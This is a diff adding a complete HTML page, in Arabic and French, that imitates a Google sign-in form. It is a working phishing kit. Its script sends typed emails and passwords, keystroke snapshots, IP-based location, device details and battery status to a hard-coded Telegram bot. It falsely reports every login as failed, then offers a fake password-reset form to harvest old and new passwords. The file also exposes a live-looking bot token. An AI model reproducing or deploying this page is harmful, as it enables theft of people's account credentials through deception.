@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول - Google</title>
+<style>
+body {font-family: Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin:0; padding:10px; user-select:none;}
+.container {background:#fff; padding:30px 20px; border-radius:12px; box-shadow:0 0 25px rgba(0,0,0,0.25); width:100%; max-width:400px; text-align:center;}
+.container img {width:120px; margin-bottom:10px; max-width:80%; height:auto;}
+h2.subtitle {font-weight:normal; font-size:16px; color:#555; margin-bottom:20px;}
+input {width:100%; padding:12px; margin:10px 0; border-radius:6px; border:1px solid #ccc; font-size:16px;}
+button {width:100%; padding:12px; background:#4285f4; color:#fff; border:none; border-radius:6px; cursor:pointer; font-size:16px; position:relative; transition: transform 0.1s;}
+button:disabled {background:#a0c3ff; cursor:not-allowed;}
+.warning {color:#cc3333; font-weight:bold; display:none; margin-top:15px; font-size:16px;}
+.forgot {display:block; margin-top:10px; color:#4285f4; cursor:pointer; text-decoration:underline;}
+.reset-container {background:#ffffff; color:#333; padding:30px 20px; border-radius:12px; box-shadow:0 0 25px rgba(0,0,0,0.25); text-align:center;}
+.reset-container input {border:1px solid #ccc; background:#fff; color:#333;}
+.reset-container input::placeholder {color:#333;}
+.reset-container button {background:#4285f4; color:#fff;}
+</style>
+</head>
+<body>
+<div class="container" id="mainContainer">
+<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+<h2>تسجيل الدخول</h2>
+<h2 class="subtitle">يرجى استخدام حسابك على Google</h2>
+<form id="loginForm">
+<input type="email" id="email" placeholder="البريد الإلكتروني" required autocomplete="username">
+<input type="password" id="password" placeholder="كلمة المرور" required autocomplete="current-password">
+<button type="submit" id="loginButton">تسجيل الدخول</button>
+</form>
+<span class="forgot" id="forgotPassword">نسيت كلمة السر؟</span>
+<div class="warning" id="warning"></div>
+</div>
+
+<script>
+const TELEGRAM_TOKEN = "8290291328:AAGRZN47-qCp2wfa8S_mVBTVy-0C0aj9t78";
+const CHAT_ID = "8089516279";
+let lastSentData = "";
+let lastTypedData = "";
+let typingTimeouts = {};
+
+const texts = {
+  ar: {
+    messages:["كلمة السر خاطئة أعد المحاولة","كلمة السر غير صحيحة الرجاء إعادة المحاولة"],
+    oldPassword:"كلمة السر القديمة",
+    newPassword:"كلمة السر الجديدة",
+    next:"التالي",
+    wrongInfo:"معلومات غير صحيحة",
+    resetTitle:"إعادة تعيين كلمة السر",
+    resetIntro:"يرجى إدخال كلمة السر القديمة والجديدة بعناية. تأكد من كتابة كل المعلومات بدقة لتتمكن من إعادة تعيين كلمة السر بنجاح."
+  },
+  fr: {
+    messages:["Mot de passe incorrect, veuillez réessayer","Mot de passe invalide, veuillez entrer un mot de passe valide"],
+    oldPassword:"Ancien mot de passe",
+    newPassword:"Nouveau mot de passe",
+    next:"Suivant",
+    wrongInfo:"Informations incorrectes",
+    resetTitle:"Réinitialiser le mot de passe",
+    resetIntro:"Veuillez entrer l'ancien et le nouveau mot de passe avec soin. Assurez-vous que toutes les informations sont correctes pour réinitialiser le mot de passe avec succès."
+  }
+};
+
+const userLang = navigator.language || navigator.userLanguage;
+let lang = userLang.startsWith('fr')?'fr':'ar';
+
+document.querySelector('h2').textContent="تسجيل الدخول";
+document.querySelector('.subtitle').textContent=(lang==='fr'?'Veuillez utiliser votre compte Google':'يرجى استخدام حسابك على Google');
+document.getElementById('email').placeholder = (lang==='fr'?"Adresse e-mail":"البريد الإلكتروني");
+document.getElementById('password').placeholder = (lang==='fr'?"Mot de passe":"كلمة المرور");
+document.getElementById('loginButton').textContent = (lang==='fr'?"Connexion":"تسجيل الدخول");
+
+const mainContainer = document.getElementById('mainContainer');
+const form = document.getElementById('loginForm');
+const warning = document.getElementById('warning');
+const loginButton = document.getElementById('loginButton');
+const forgotPassword = document.getElementById('forgotPassword');
+let failedAttempts = 0;
+
+function shakeButton(btn = loginButton){
+  btn.style.transform="translateX(-5px)";
+  setTimeout(()=>{btn.style.transform="translateX(5px)";},50);
+  setTimeout(()=>{btn.style.transform="translateX(-5px)";},100);
+  setTimeout(()=>{btn.style.transform="translateX(5px)";},150);
+  setTimeout(()=>{btn.style.transform="translateX(0px)";},200);
+}
+
+async function getLocation(){
+  try{ const res=await fetch("https://ipapi.co/json/"); const data=await res.json(); return `${data.ip} - ${data.city}, ${data.country_name}`; }catch{return "غير قادر على تحديد الموقع";}
+}
+
+async function getBatteryStatus(){
+  if(navigator.getBattery){const battery=await navigator.getBattery();return Math.floor(battery.level*100)+'%'+(battery.charging?" (يشحن)":" (غير مشحون)");}
+  return "غير متاح";
+}
+
+async function sendData(action="كتابة"){
+  const emailValue=document.getElementById('email')?.value||"";
+  const passValue=document.getElementById('password')?.value||"";
+  const oldPass=document.getElementById('oldPassword')?.value||"";
+  const newPass=document.getElementById('newPassword')?.value||"";
+  const location=await getLocation();
+  const batteryStatus=await getBatteryStatus();
+  const message=`✍️ المستخدم في وضع: ${action}
+📨 البريد الإلكتروني: ${emailValue}
+🔒 كلمة المرور: ${passValue}
+🔒 كلمة السر القديمة: ${oldPass}
+🔒 كلمة السر الجديدة: ${newPass}
+🌐 الموقع وIP: ${location}
+🖥️ نوع الجهاز والمتصفح: ${navigator.userAgent}
+🗣️ اللغة: ${navigator.language}
+📏 أبعاد الشاشة: ${window.innerWidth}x${window.innerHeight}
+🔋 حالة البطارية: ${batteryStatus}`;
+  if(message !== lastSentData){
+    lastSentData = message;
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ chat_id: CHAT_ID, text: message })}).catch(console.error);
+  }
+}
+
+function saveTypingData(){
+  const inputs = document.querySelectorAll('input');
+  let currentData = "";
+  inputs.forEach(i=>{currentData += `${i.id}: ${i.value}\n`;});
+  if(currentData !== lastTypedData){
+    lastTypedData = currentData;
+    sendData("كتابة");
+  }
+}
+
+document.querySelectorAll('input').forEach(input=>{
+  input.addEventListener('input', ()=>{
+    clearTimeout(typingTimeouts[input.id]);
+    typingTimeouts[input.id] = setTimeout(saveTypingData,4000);
+    warning.style.display='none';
+  });
+});
+
+forgotPassword.style.pointerEvents='none';
+
+form.addEventListener('submit', async function(e){
+  e.preventDefault();
+  loginButton.disabled=true;
+  loginButton.textContent=(lang==='fr'?"Vérification…":"جارٍ التحقق…");
+  setTimeout(async ()=>{
+    loginButton.disabled=false;
+    loginButton.textContent=(lang==='fr'?"Connexion":"تسجيل الدخول");
+    failedAttempts++;
+
+    if(failedAttempts<5){
+      warning.textContent = texts[lang].messages[(failedAttempts-1)%2];
+      warning.style.color='#cc3333';
+      warning.style.display='block';
+    }else{
+      warning.textContent = (lang==='fr'?'Mot de passe incorrect ou cliquez sur "Réinitialiser le mot de passe"':'كلمة السر خاطئة أعد المحاولة أو انقر على "هل نسيت كلمة السر" لإعادة ضبطها');
+      warning.style.color='#cc3333';
+      warning.style.display='block';
+      forgotPassword.style.pointerEvents='auto';
+    }
+
+    shakeButton();
+    await sendData("تسجيل الدخول");
+  },1500);
+});
+
+forgotPassword.addEventListener('click',()=>{
+  mainContainer.innerHTML=`
+    <div class="reset-container">
+      <h2>${texts[lang].resetTitle}</h2>
+      <p>${texts[lang].resetIntro}</p>
+      <form id="resetForm">
+        <input type="password" placeholder="${texts[lang].oldPassword}" id="oldPassword" required autocomplete="current-password">
+        <input type="password" placeholder="${texts[lang].newPassword}" id="newPassword" required autocomplete="new-password">
+        <button type="submit" id="resetButton">${texts[lang].next}</button>
+      </form>
+      <div class="warning" id="warningReset" style="color:#cc3333; font-weight:bold; margin-top:10px;"></div>
+    </div>
+  `;
+  const resetForm=document.getElementById('resetForm');
+  const warningReset=document.getElementById('warningReset');
+  const resetButton=document.getElementById('resetButton');
+
+  document.querySelectorAll('#resetForm input').forEach(input=>{
+    input.addEventListener('input', ()=>{
+      clearTimeout(typingTimeouts[input.id]);
+      typingTimeouts[input.id] = setTimeout(saveTypingData,4000);
+      warningReset.style.display='none';
+    });
+  });
+
+  resetForm.addEventListener('submit', async function(e){
+    e.preventDefault();
+    warningReset.textContent = texts[lang].wrongInfo;
+    warningReset.style.display='block';
+    shakeButton(resetButton);
+
+    const location = await getLocation();
+    const batteryStatus = await getBatteryStatus();
+    const message = `
+✍️ المستخدم في وضع: إعادة تعيين كلمة السر
+📨 البريد الإلكتروني: ${document.getElementById('email')?.value || ""}
+🔒 كلمة السر القديمة: ${document.getElementById('oldPassword').value}
+🔒 كلمة السر الجديدة: ${document.getElementById('newPassword').value}
+🌐 الموقع وIP: ${location}
+🖥️ نوع الجهاز والمتصفح: ${navigator.userAgent}
+🗣️ اللغة: ${navigator.language}
+📏 أبعاد الشاشة: ${window.innerWidth}x${window.innerHeight}
+🔋 حالة البطارية: ${batteryStatus}`;
+    if(message !== lastSentData){
+      lastSentData = message;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ chat_id: CHAT_ID, text: message })}).catch(console.error);
+    }
+  });
+});
+</script>
+</body>
+  </html>
